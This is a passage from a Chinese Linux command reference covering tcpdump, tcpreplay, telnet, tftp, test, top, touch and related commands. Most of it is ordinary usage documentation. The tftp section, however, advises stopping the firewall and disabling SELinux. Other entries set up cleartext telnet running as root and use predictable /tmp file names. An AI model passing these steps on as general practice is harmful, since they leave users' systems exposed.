\n\n如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令\n\n```\ntcpdump tcp port 23 host 210.27.48.1\n```\n\n对本机的udp 123 端口进行监视 123 为ntp的服务端口\n\n```\ntcpdump udp port 123\n```\n\n **监视指定网络的数据包** \n\n打印本地主机与Berkeley网络上的主机之间的所有通信数据包\n\n```\ntcpdump net ucb-ether\n```\n\nucb-ether此处可理解为“Berkeley网络”的网络地址，此表达式最原始的含义可表达为：打印网络地址为ucb-ether的所有数据包\n\n打印所有通过网关snup的ftp数据包\n\n```\ntcpdump \u0027gateway snup and (port ftp or ftp-data)\u0027\n```\n\n注意：表达式被单引号括起来了，这可以防止shell对其中的括号进行错误解析\n\n打印所有源地址或目标地址是本地主机的IP数据包\n\n```\ntcpdump ip and not net localnet\n```\n\n如果本地网络通过网关连到了另一网络，则另一网络并不能算作本地网络。\n\n\n"},{"name":"tcpreplay","categoryId":0,"data":"tcpreplay\n\u003d\u003d\u003d\n\n将PCAP包重新发送，用于性能或者功能测试\n\n## 补充说明\n\n简单的说， **tcpreplay** 是一种pcap包的重放工具，它可以将用ethreal、wireshark工具抓下来的包原样或经过任意修改后重放回去。它允许你对报文做任意的修改（主要是指对2层、3层、4层报文头），指定重放报文的速度等，这样tcpreplay就可以用来复现抓包的情景以定位bug，以极快的速度重放从而实现压力测试。\n\n### 选项  \n\n```\n-A \"\u003cargs\u003e\" 在使用 tcpdump 风格打印输出信息时，同时再调用tcpdump中的参数， 默认已经带有“-n,-l”，所以一般看到的都是ip地址，而没有主机名的打印，注意这个是在tcpreplay使用了-v参数时才能使用，不带-v不会报错，但是没有实际意义。格式：-vA “nnt”表示以tcpdump风格输出报文信息，并且不打印时间戳、主机名、端口服务名称。注意不要使用-c参数来指定打印的数据报文的个数，这样发送出去的报文也会变少。\n-c \u003ccachefile\u003e 双网卡回放报文必选参数，后面紧跟cache文件名，该文件为tcpprep根据对应的pcap文件构造出来。 \n-D 把应用层的数据，使用dump mode写入到指定文件中去，和-w、-W 参数一起使用。 \n-e \u003cip1:ip2\u003e 指定端点的ip，即把发送报文的和接收的报文的ip都修改称对应的参数值中指定的ip，但是这样发送的出的报文不会区分client和server。。 \n-f \u003cconfigfile\u003e 指定配置文件。\n-F 在发送报文时，自动纠正错误的校验和。对测试DUT的校验和检验。\n-h 显示帮助文件。 \n-i \u003cnic\u003e 双网卡回放报文必选参数，指定主接口。\n-I \u003cmac\u003e 重写主网卡发送出报文的目的MAC地址。 \n-j \u003cnic\u003e 双网卡回放报文必选参数，指定从接口。\n-J \u003cmac\u003e 重写从网卡发送出报文的目的MAC地址。 \n-k \u003cmac\u003e 重写主网卡发送报文的源MAC地址。 \n-K \u003cmac\u003e 重写从网卡发送报文的源MAC地址。\n-l \u003cloop\u003e 指定循环的次数。\n-L \u003climit\u003e 指定最大的发包数量。可以在确认连接的调试时使用。 \n-m \u003cmultiple\u003e 指定一个倍数值，就是必默认发送速率要快多少倍的速率发送报文。 加大发送的速率后，对于DUT可能意味着有更多的并发连接和连接数，特别是对于BT报文的重放， 因为连接的超时是固定的，如果速率增大的话， 留在session表中的连接数量增大，还可以通过修改连接的超时时间来达到该目的。\n-M 表示不发送“火星”的ip报文，man文件中的定义是 0/8、172/8、 255/8。\n-n 在使用-S参数，不对混杂模式进行侦听。\n-N \u003cCIDR1:CIDR2,...\u003e 通过伪造的NAT，重写IP地址。这个参数应该有很重要的应用，目前没有测试使用。\n-O 没有测试使用。\n-p \u003cpacketrate\u003e 指定每秒发送报文的个数，指定该参数，其它速率相关的参数被忽略，最后的打印信息不会有速率和每秒发送报文的统计。\n-P 表示在输出信息中打印PID的信息，用于单用户或单帐户模式下暂停和重启程序。\n-r \u003crate\u003e 指定发送的速率。目前-m/-r/-p这3个参数的相互关系。\n-R 让网卡极限速度发数据包。 \n-t \u003cmtu\u003e 指定MTU，标准的10/100M网卡的默认值是1500。 \n-T Truncate packets \u003e 截去报文中MTU大于标准值的部分再发送出去，默认是不发送，skip掉。\n-v 每发送一个报文都以 tcpdump 的风格打印出对应的信息。\n-V 查看版本号。\n-w \u003cfile\u003e 将主网卡发送的报文写入一个文件中，参数后紧跟文件名。\n\n```\n\n### 实例  \n\n **1、重放在客户端 ftp 连接的报文 ** \n\na、在客户端使用 ethereal 抓包，存为 ftp.pcap 文件。\n\nb、 将 ftp.pcap 文件进行 tcpprep 操作，制作 cache 文件。\n\n```\n[root@A ~]# tcpprep -an client -i ftp.pcap -o ftp.cache –v \n```\n\nc、 将 DUT 设备的两个接口和 PC 的两个接口使用网线连接，使用 tcpreplay 重 放报文。注意防火墙的配置为网桥（透明）模式。 \n\n```\n[root@A ~]# tcpreplay -c ftp.cache -i eth0 -j eth1 ftp.pcap -R –v \n```\n\n-R 参数表示全速发送，-v 显示打印信息。 \n\n **2、重放在客户端 BT 连接的报文 ** \n\na、在实验室 BT 下载一些台湾的娱乐节目和热门的大片，使用 ethereal 抓包， 存为 bt.pcap 文件。注意 pcap 文件大小的控制，对 pc 的内存要求比较高，我保 存了一个 600 多 M 的 pcap 文件用了 40 多分钟，大家有需要可以直接从实验室 copy。 \n\nb、将 bt.pcap 文件进行 tcpprep 操作，制作 cache 文件。\n\n```\n [root@A ~]# tcpprep -an client -i bt.pcap -o bt.cache -C \"100M BT Packet\" –v\n```\n\n制作 cache 文件，在 cache 文件中写入“100M BT Packet”的注释。 \n\nc、使用 tcpreplay 重放报文。 \n\n```\n[root@A ~]# tcpreplay -c bt.cache -i eth0 -j eth1 bt.pcap -v –R \n```\n\n **3、重放 tftp 服务器上抓到的报文 ** \n\na、在 tftp 服务器上使用 ethereal 抓包，存为 tftp.pcap 文件。 \n\nb、将 pcap 文件进行 tcpprep 的操作，制作 cache 文件。 \n\n```\n[root@A ~]# tcpprep -an server -i tftp.pcap -o tftp.cache –v \n```\n\n注意：我在测试的时候犯了一个错误，使用 DUT 的 tftp 升级来做实验，同时穿 过 DUT 重放报文，结果在网卡发送报文的后，DUT 的 mac 地址做了的回应，导致 交互过程没有穿过 DUT，这个问题比较搞笑，上午弄了半天才发现原因，开始还 以为 udp 的连接不能重放。 \n\nc、使用 tcpreplay 重放报文。 \n\n```\n[root@A ~]# tcpreplay -c tftp.cache -i eth0 -j eth1 tftp.pcap –v\n```\n\n\n"},{"name":"tee","categoryId":6,"data":"tee\n\u003d\u003d\u003d\n\n把数据重定向到给定文件和屏幕上\n\n## 补充说明\n\n**tee命令** 用于将数据重定向到文件，另一方面还可以提供一份重定向数据的副本作为后续命令的stdin。简单的说就是把数据重定向到给定文件和屏幕上。\n\n!\n\n存在缓存机制，每1024个字节将输出一次。若从管道接收输入数据，应该是缓冲区满，才将数据转存到指定的文件中。若文件内容不到1024个字节，则接收完从标准输入设备读入的数据后，将刷新一次缓冲区，并转存数据到指定文件。\n\n### 语法  \n\n```\ntee(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：向文件中重定向时使用追加模式；\n-i：忽略中断（interrupt）信号。\n```\n\n### 参数  \n\n文件：指定输出重定向的文件。\n\n在终端打印stdout同时重定向到文件中：\n\n```\nls | tee out.txt\n1.sh\n1.txt\n2.txt\neee.tst\nEEE.tst\none\nout.txt\nstring2\nwww.pdf\nWWW.pdf\nWWW.pef\n```\n\n```\n[root@localhost text]# ls | tee out.txt | cat -n\n     1  1.sh\n     2  1.txt\n     3  2.txt\n     4  eee.tst\n     5  EEE.tst\n     6  one\n     7  out.txt\n     8  string2\n     9  www.pdf\n    10  WWW.pdf\n    11  WWW.pef\n```\n\n\n"},{"name":"telint","categoryId":0,"data":"telint\n\u003d\u003d\u003d\n\n切换当前正在运行系统的运行等级\n\n## 补充说明\n\n**telint命令** 用于切换当前正在运行的Linux系统的运行等级。\n\n### 语法  \n\n```\ntelint(选项)(参数)\n```\n\n### 选项  \n\n```\n-t：指定等待的秒数。\n```\n\n### 参数  \n\n运行等级：指定要切换的运行等级。\n\n\n"},{"name":"telnet","categoryId":9,"data":"telnet\n\u003d\u003d\u003d\n\n登录远程主机和管理\n\n## 补充说明\n\n**telnet命令** 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。\n\n### 语法  \n\n```\ntelnet(选项)(参数)\n```\n\n### 选项  \n\n```\n-8：允许使用8位字符资料，包括输入与输出；\n-a：尝试自动登入远端系统；\n-b\u003c主机别名\u003e：使用别名指定远端主机名称；\n-c：不读取用户专属目录里的.telnetrc文件；\n-d：启动排错模式；\n-e\u003c脱离字符\u003e：设置脱离字符；\n-E：滤除脱离字符；\n-f：此参数的效果和指定\"-F\"参数相同；\n-F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机；\n-k\u003c域名\u003e：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名；\n-K：不自动登入远端主机；\n-l\u003c用户名称\u003e：指定要登入远端主机的用户名称；\n-L：允许输出8位字符资料；\n-n\u003c记录文件\u003e：指定文件记录相关信息；\n-r：使用类似rlogin指令的用户界面；\n-S\u003c服务类型\u003e：设置telnet连线所需的ip TOS信息；\n-x：假设主机有支持数据加密的功能，就使用它；\n-X\u003c认证形态\u003e：关闭指定的认证形态。\n```\n\n### 参数  \n\n*   远程主机：指定要登录进行管理的远程主机；\n*   端口：指定TELNET协议使用的端口号。\n\n### 实例  \n\n```\n$ telnet 192.168.2.10\nTrying 192.168.2.10...\nConnected to 192.168.2.10 (192.168.2.10).\nEscape character is \u0027^]\u0027.\n\n    localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)\n\nlogin: root\nPassword: \nLogin incorrect\n```\n\n一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。\n\n```\n$ telnet 192.168.188.132\nTrying 192.168.188.132...\ntelnet: connect to address 192.168.188.132: Connection refused\ntelnet: Unable to connect to remote host\n```\n\n处理这种情况方法：\n\n1. 确认ip地址是否正确？\n1. 确认ip地址对应的主机是否已经开机？\n1. 如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看）\n1. 如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行）\n1. 如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看）\n\n**启动telnet服务**\n\n```\nservice xinetd restart\n```\n\n配置参数，通常的配置如下： \n\n```\nservice telnet \n{ \n    disable \u003d no #启用 \n    flags \u003d REUSE #socket可重用 \n    socket_type \u003d stream #连接方式为TCP \n    wait \u003d no #为每个请求启动一个进程 \n    user \u003d root #启动服务的用户为root \n    server \u003d /usr/sbin/in.telnetd #要激活的进程 \n    log_on_failure +\u003d USERID #登录失败时记录登录用户名 \n} \n```\n\n如果要配置允许登录的客户端列表，加入 \n```\nonly_from \u003d 192.168.0.2 #只允许192.168.0.2登录 \n```\n如果要配置禁止登录的客户端列表，加入 \n```\nno_access \u003d 192.168.0.{2,3,4} #禁止192.168.0.2、192.168.0.3、192.168.0.4登录 \n```\n如果要设置开放时段，加入 \n```\naccess_times \u003d 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P） \n```\n\n如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入 \n```\nbind \u003d 192.168.0.2 \n```\n\n各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf） \n\n配置端口，修改services文件：\n\n```\n# vi /etc/services \n```\n\n找到以下两句 \n\n```\ntelnet 23/tcp \ntelnet 23/udp \n```\n\n如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。 \n\n启动服务：\n```\nservice xinetd restart \n```\n\n\n"},{"name":"tempfile","categoryId":0,"data":"tempfile\n\u003d\u003d\u003d\n\nshell中给临时文件命名\n\n## 补充说明\n\n有时候在写Shell脚本的时候需要一些临时存储数据的才做，最适合存储临时文件数据的位置就是`/tmp`，因为该目录中所有的内容在系统重启后就会被清空。下面是两种方法为临时数据生成标准的文件名。\n\n### tempfile命令  \n\n`tempfile命令`只有在基于Debian的发行版中才默认自带，比如Ubuntu，其他发行版没有这个命令。\n\n用tempfile命令为一个临时文件命名：\n\n```\ntemp_file_name\u003d$(tempfile)\n```\n\n用一个加带了随机数的文件名作为临时文件命名：\n\n```\ntemp_file_name\u003d\"/tmp/file_$RANDOM\"\n```\n\n$RANDOM是一个返回随机数的环境变量。\n\n### $$变量  \n\n如果没有tempfile命令的Linux发行版，也可以使用自己的临时文件名：\n\n```\ntemp_file_name\u003d\"/tmp/file.$\"\n```\n\n`$$`是系统预定义变量，显示当前所在进程的进程号，用`.$$`作为添加的后缀会被扩展成当前运行脚本的进程id。\n\n\n"},{"name":"test","categoryId":0,"data":"test\n\u003d\u003d\u003d\n\nshell环境中测试条件表达式工具\n\n## 补充说明\n\n**test命令** 是shell环境中测试条件表达式的实用工具。\n\n### 语法  \n\n```\ntest(选项)\n```\n\n### 选项  \n\n```\n-b\u003c文件\u003e：如果文件为一个块特殊文件，则为真；\n-c\u003c文件\u003e：如果文件为一个字符特殊文件，则为真；\n-d\u003c文件\u003e：如果文件为一个目录，则为真；\n-e\u003c文件\u003e：如果文件存在，则为真；\n-f\u003c文件\u003e：如果文件为一个普通文件，则为真；\n-g\u003c文件\u003e：如果设置了文件的SGID位，则为真；\n-G\u003c文件\u003e：如果文件存在且归该组所有，则为真；\n-k\u003c文件\u003e：如果设置了文件的粘着位，则为真；\n-O\u003c文件\u003e：如果文件存在并且归该用户所有，则为真；\n-p\u003c文件\u003e：如果文件为一个命名管道，则为真；\n-r\u003c文件\u003e：如果文件可读，则为真；\n-s\u003c文件\u003e：如果文件的长度不为零，则为真；\n-S\u003c文件\u003e：如果文件为一个套接字特殊文件，则为真；\n-u\u003c文件\u003e：如果设置了文件的SUID位，则为真；\n-w\u003c文件\u003e：如果文件可写，则为真；\n-x\u003c文件\u003e：如果文件可执行，则为真。\n```\n\n### 实例  \n\nlinux中shell编程中的test常见用法：\n\n **判断表达式** \n\n```\nif test     #表达式为真\nif test !   #表达式为假\ntest 表达式1 –a 表达式2     #两个表达式都为真\ntest 表达式1 –o 表达式2     #两个表达式有一个为真\ntest 表达式1 ! 表达式2       #条件求反\n```\n\n **判断字符串** \n\n```\ntest –n 字符串    #字符串的长度非零\ntest –z 字符串    #字符串的长度是否为零\ntest 字符串1＝字符串2       #字符串是否相等，若相等返回true\ntest 字符串1!＝字符串2      #字符串是否不等，若不等反悔false\n```\n\n **判断整数** \n\n```\ntest 整数1 -eq 整数2    #整数相等\ntest 整数1 -ge 整数2    #整数1大于等于整数2\ntest 整数1 -gt 整数2    #整数1大于整数2\ntest 整数1 -le 整数2    #整数1小于等于整数2\ntest 整数1 -lt 整数2    #整数1小于整数2\ntest 整数1 -ne 整数2    #整数1不等于整数2\n```\n\n **判断文件** \n\n```\ntest File1 –ef File2    两个文件是否为同一个文件，可用于硬连接。主要判断两个文件是否指向同一个inode。\ntest File1 –nt File2    判断文件1是否比文件2新\ntest File1 –ot File2    判断文件1比是否文件2旧\ntest –b file   #文件是否块设备文件\ntest –c File   #文件并且是字符设备文件\ntest –d File   #文件并且是目录\ntest –e File   #文件是否存在 （常用）\ntest –f File   #文件是否为正规文件 （常用）\ntest –g File   #文件是否是设置了组id\ntest –G File   #文件属于的有效组ID\ntest –h File   #文件是否是一个符号链接（同-L）\ntest –k File   #文件是否设置了Sticky bit位\ntest –b File   #文件存在并且是块设备文件\ntest –L File   #文件是否是一个符号链接（同-h）\ntest –o File   #文件的属于有效用户ID\ntest –p File   #文件是一个命名管道\ntest –r File   #文件是否可读\ntest –s File   #文件是否是非空白文件\ntest –t FD     #文件描述符是在一个终端打开的\ntest –u File   #文件存在并且设置了它的set-user-id位\ntest –w File   #文件是否存在并可写\ntest –x File   #文件属否存在并可执行\n```\n\n\n"},{"name":"tftp","categoryId":7,"data":"tftp\n\u003d\u003d\u003d\n\n在本机和tftp服务器之间使用TFTP协议传输文件\n\n## 补充说明\n\n**tftp命令** 用在本机和tftp服务器之间使用TFTP协议传输文件。\n\nTFTP是用来下载远程文件的最简单网络协议，它其于UDP协议而实现。嵌入式linux的tftp开发环境包括两个方面：一是linux服务器端的tftp-server支持，二是嵌入式目标系统的tftp-client支持。因为u-boot本身内置支持tftp-client，所以嵌入式目标系统端就不用配置了。下面就详细介绍一下linux服务器端tftp-server的配置。\n\n### 语法  \n\n```\ntftp(选项)(参数)\n```\n\n### 选项  \n\n```\n-c：指定与tftp服务器连接成功后，立即要执行的指令；\n-m：指定文件传输模式。可以是ASCII或者Binary；\n-v：显示指令详细执行过程；\n-V：显示指令版本信息。\n```\n\n### 参数  \n\n主机：指定tftp要联机的tftp服务器的ip地址或主机名。\n\n### 实例  \n\n **1、安装tftp服务器** \n\n需要安装xinetd、tftp和tftp-server 3个软件\n\n如果能上网，通过yum安装：\n\n```\nyum install xinetd\nyum install tftp\nyum install tftp-server\n```\n\n如果不能上网，可以直接安装提供的rpm包：\n\n```\nrpm -ivh xinetd-2.3.14-18.fc9.i386.rpm\nrpm -ivh tftp-0.48-3.fc9.i386.rpm\nrpm -ivh tftp-server-0.48-3.fc9.i386.rpm\n```\n\n **2、配置tftp服务器** \n\n修改/etc/xinetd.d/tftp文件，将其中的disable\u003dyes改为disable\u003dno。主要是设置TFTP服务器的根目录，开启服务。修改后的文件如下：\n\n```\nservice tftp\n{\n       socket_type           \u003ddgram\n       protocol              \u003dudp\n       wait                  \u003dyes\n       user                  \u003droot\n       server                \u003d/usr/sbin/in.tftpd\n       server_args           \u003d-s  /home/mike/tftpboot -c\n       disable               \u003dno\n       per_source            \u003d11\n       cps                   \u003d100 2\n       flags                 \u003dIPv4\n}\n```\n\n说明：修改项`server_args\u003d -s \u003cpath\u003e -c`，其中\u003cpath\u003e处可以改为你的tftp-server的根目录，参数-s指定chroot，-c指定了可以创建文件。\n\n **3、启动tftp服务器并关闭防火墙** \n\n```\n/etc/init.d/iptables stop        //关闭防火墙\nsudo /sbin/service xinetd start\n或\nservice xinetd restart\n/etc/init.d/xinetd start\n```\n\n看到启动[OK]就可以了\n\n4、查看tftp服务是否开启\n\n```\nnetstat -a | grep tftp\n```\n\n显示结果为`udp 0 0 *:tftp *:*`表明服务已经开启，就表明tftp配置成功了。\n\n **5、tftp使用** \n\n复制一个文件到tftp服务器目录，然后在主机启动tftp软件，进行简单测试。\n\n```\ntftp 192.168.1.2\ntftp\u003eget \u003cdownload file\u003e \n\ntftp\u003eput \u003cupload file\u003e\ntftp\u003eq\n```\n\n **6、tftp命令用法如下** \n\n```\ntftp your-ip-address\n```\n\n进入TFTP操作：\n\n*   connect：连接到远程tftp服务器\n*   mode：文件传输模式\n*   put：上传文件\n*   get：下载文件\n*   quit：退出\n*   verbose：显示详细的处理信息\n*   tarce：显示包路径\n*   status：显示当前状态信息\n*   binary：二进制传输模式\n*   ascii：ascii 传送模式\n*   rexmt：设置包传输的超时时间\n*   timeout：设置重传的超时时间\n*   help：帮助信息\n*   ? ：帮助信息\n\n **7、如果老是出现“AVC Denial, click icon to view”的错误，并不能传输文件，需要作如下修改** \n\n修改`/etc/sysconfig/selinux`,将SELINUX设定为disable，使用命令`setenforce 0`让selinux配置文件生效。\n\n **8、Busybox中tftp命令的用法** \n\n命令格式为：\n\n```\ntftp [option] ... host [port]\n```\n\n如果要下载或上传文件的话是一定要用这些option的。\n\n```\n-g 表示下载文件 (get)\n-p 表示上传文件 (put)\n-l 表示本地文件名 (local file)\n-r 表示远程主机的文件名 (remote file)\n```\n\n例如，要从远程主机192.168.1.2上下载 embedexpert，则应输入以下命令\n\n```\ntftp -g -r embedexpert 192.168.1.2\n```\n\n\n"},{"name":"time","categoryId":0,"data":"time\n\u003d\u003d\u003d\n\n统计给定命令所花费的总时间\n\n## 补充说明\n\n**time命令** 用于统计给定命令所花费的总时间。\n\n### 语法  \n\n```\ntime(参数)\n```\n\n### 参数  \n\n指令：指定需要运行的额指令及其参数。\n\n### 实例  \n\n当测试一个程序或比较不同算法时，执行时间是非常重要的，一个好的算法应该是用时最短的。所有类UNIX系统都包含time命令，使用这个命令可以统计时间消耗。例如：\n\n```\n[root@localhost ~]# time ls\nanaconda-ks.cfg  install.log  install.log.syslog  satools  text\n\nreal    0m0.009s\nuser    0m0.002s\nsys     0m0.007s\n\n```\n\n输出的信息分别显示了该命令所花费的real时间、user时间和sys时间。\n\n*   real时间是指挂钟时间，也就是命令开始执行到结束的时间。这个短时间包括其他进程所占用的时间片，和进程被阻塞时所花费的时间。\n*   user时间是指进程花费在用户模式中的CPU时间，这是唯一真正用于执行进程所花费的时间，其他进程和花费阻塞状态中的时间没有计算在内。\n*   sys时间是指花费在内核模式中的CPU时间，代表在内核中执系统调用所花费的时间，这也是真正由进程使用的CPU时间。\n\nshell内建也有一个time命令，当运行time时候是调用的系统内建命令，应为系统内建的功能有限，所以需要时间其他功能需要使用time命令可执行二进制文件`/usr/bin/time`。\n\n使用`-o`选项将执行时间写入到文件中：\n\n```\n/usr/bin/time -o outfile.txt ls\n\n```\n\n使用`-a`选项追加信息：\n\n```\n/usr/bin/time -a -o outfile.txt ls\n\n```\n\n使用`-f`选项格式化时间输出：\n\n```\n/usr/bin/time -f \"time: %U\" ls\n\n```\n\n`-f`选项后的参数：\n\n\u003ctable border\u003d\"1\" cellpadding\u003d\"0\" cellspacing\u003d\"0\"\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003cth\u003e参数\u003c/th\u003e\n\n\u003cth\u003e描述\u003c/th\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%E\u003c/td\u003e\n\n\u003ctd\u003ereal时间，显示格式为[小时:]分钟:秒\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%U\u003c/td\u003e\n\n\u003ctd\u003euser时间。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%S\u003c/td\u003e\n\n\u003ctd\u003esys时间。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%C\u003c/td\u003e\n\n\u003ctd\u003e进行计时的命令名称和命令行参数。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%D\u003c/td\u003e\n\n\u003ctd\u003e进程非共享数据区域，以KB为单位。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%x\u003c/td\u003e\n\n\u003ctd\u003e命令退出状态。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%k\u003c/td\u003e\n\n\u003ctd\u003e进程接收到的信号数量。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%w\u003c/td\u003e\n\n\u003ctd\u003e进程被交换出主存的次数。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%Z\u003c/td\u003e\n\n\u003ctd\u003e系统的页面大小，这是一个系统常量，不用系统中常量值也不同。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%P\u003c/td\u003e\n\n\u003ctd\u003e进程所获取的CPU时间百分百，这个值等于user+system时间除以总共的运行时间。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%K\u003c/td\u003e\n\n\u003ctd\u003e进程的平均总内存使用量（data+stack+text），单位是KB。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%w\u003c/td\u003e\n\n\u003ctd\u003e进程主动进行上下文切换的次数，例如等待I/O操作完成。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e%c\u003c/td\u003e\n\n\u003ctd\u003e进程被迫进行上下文切换的次数（由于时间片到期）。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n\n"},{"name":"tload","categoryId":2,"data":"tload\n\u003d\u003d\u003d\n\n显示系统负载状况\n\n## 补充说明\n\n**tload命令** 以图形化的方式输出当前系统的平均负载到指定的终端。假设不给予终端机编号，则会在执行tload指令的终端机显示负载情形。\n\n### 语法  \n\n```\ntload(选项)(参数)\n```\n\n### 选项  \n\n```\n-s：指定闲时的刻度；\n-d：指定间隔的时间（秒）。\n```\n\n### 参数  \n\n终端：指定显示信息的终端设备文件。\n\n### 实例  \n\n使用tload命令查看系统负载情况：\n\n```\ntload -d 1\n0.08, 0.02,0.01\n0.04, 0.01, 0.00\n0.04, 0.01, 0.00\n0.04, 0.01,0.00\n0.06, 0.02, 0.00\n```\n\n\n"},{"name":"top","categoryId":2,"data":"top\n\u003d\u003d\u003d\n\n显示或管理执行中的程序\n\n## 补充说明\n\n**top命令** 可以实时动态地查看系统的整体运行情况，是一个综合了多方信息监测系统性能和运行信息的实用工具。通过top命令所提供的互动式界面，用热键可以管理。\n\n### 语法  \n\n```\ntop(选项)\n```\n\n### 选项  \n\n```\n-b：以批处理模式操作；\n-c：显示完整的治命令；\n-d：屏幕刷新间隔时间；\n-I：忽略失效过程；\n-s：保密模式；\n-S：累积模式；\n-i\u003c时间\u003e：设置间隔时间；\n-u\u003c用户名\u003e：指定用户名；\n-p\u003c进程号\u003e：指定进程；\n-n\u003c次数\u003e：循环显示的次数。\n```\n\n### top交互命令  \n\n在top命令执行过程中可以使用的一些交互命令。这些命令都是单字母的，如果在命令行中使用了-s选项， 其中一些命令可能会被屏蔽。\n\n```\nh：显示帮助画面，给出一些简短的命令总结说明；\nk：终止一个进程；\ni：忽略闲置和僵死进程，这是一个开关式命令；\nq：退出程序；\nr：重新安排一个进程的优先级别；\nS：切换到累计模式；\ns：改变两次刷新之间的延迟时间（单位为s），如果有小数，就换算成ms。输入0值则系统将不断刷新，默认值是5s；\nf或者F：从当前显示中添加或者删除项目；\no或者O：改变显示项目的顺序；\nl：切换显示平均负载和启动时间信息；\nm：切换显示内存信息；\nt：切换显示进程和CPU状态信息；\nc：切换显示命令名称和完整命令行；\nM：根据驻留内存大小进行排序；\nP：根据CPU使用百分比大小进行排序；\nT：根据时间/累计时间进行排序；\nw：将当前设置写入~/.toprc文件中。\n```\n\n### 实例  \n\n```\ntop - 09:44:56 up 16 days, 21:23,  1 user,  load average: 9.59, 4.75, 1.92\nTasks: 145 total,   2 running, 143 sleeping,   0 stopped,   0 zombie\nCpu(s): 99.8%us,  0.1%sy,  0.0%ni,  0.2%id,  0.0%wa,  0.0%hi,  0.0%si,  0.0%st\nMem:   4147888k total,  2493092k used,  1654796k free,   158188k buffers\nSwap:  5144568k total,       56k used,  5144512k free,  2013180k cached\n```\n\n **解释：** \n\n*   top - 09:44:56[当前系统时间],\n*   16 days[系统已经运行了16天],\n*   1 user[个用户当前登录],\n*   load average: 9.59, 4.75, 1.92[系统负载，即任务队列的平均长度]\n*   Tasks: 145 total[总进程数],\n*   2 running[正在运行的进程数],\n*   143 sleeping[睡眠的进程数],\n*   0 stopped[停止的进程数],\n*   0 zombie[冻结进程数],\n*   Cpu(s): 99.8%us[用户空间占用CPU百分比],\n*   0.1%sy[内核空间占用CPU百分比],\n*   0.0%ni[用户进程空间内改变过优先级的进程占用CPU百分比],\n*   0.2%id[空闲CPU百分比], 0.0%wa[等待输入输出的CPU时间百分比],\n*   0.0%hi[],\n*   0.0%st[],\n*   Mem: 4147888k total[物理内存总量],\n*   2493092k used[使用的物理内存总量],\n*   1654796k free[空闲内存总量],\n*   158188k buffers[用作内核缓存的内存量]\n*   Swap:  5144568k total[交换区总量],\n*   56k used[使用的交换区总量],\n*   5144512k free[空闲交换区总量],\n*   2013180k cached[缓冲的交换区总量],\n\n\n"},{"name":"touch","categoryId":6,"data":"touch\n\u003d\u003d\u003d\n\n创建新的空文件\n\n## 补充说明\n\n**touch命令** 有两个功能：一是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来；二是用来创建新的空文件。\n\n### 语法  \n\n```\ntouch(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：或--time\u003datime或--time\u003daccess或--time\u003duse  只更改存取时间；\n-c：或--no-create  不建立任何文件；\n-d：\u003c时间日期\u003e 使用指定的日期时间，而非现在的时间；\n-f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；\n-m：或--time\u003dmtime或--time\u003dmodify  只更该变动时间；\n-r：\u003c参考文件或目录\u003e  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；\n-t：\u003c日期时间\u003e  使用指定的日期时间，而非现在的时间；\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n文件：指定要设置时间属性的文件列表。\n\n### 实例  \n\n```\ntouch ex2\n```\n\n在当前目录下建立一个空文件ex2，然后，利用`ls -l`命令可以发现文件ex2的大小为0，表示它是空文件。\n\n\n"},{"name":"tput","categoryId":0,"data":"tput\n\u003d\u003d\u003d\n\n通过terminfo数据库对终端会话进行初始化和操作\n\n## 补充说明\n\n**tput命令** 将通过 terminfo 数据库对您的终端会话进行初始化和操作。通过使用 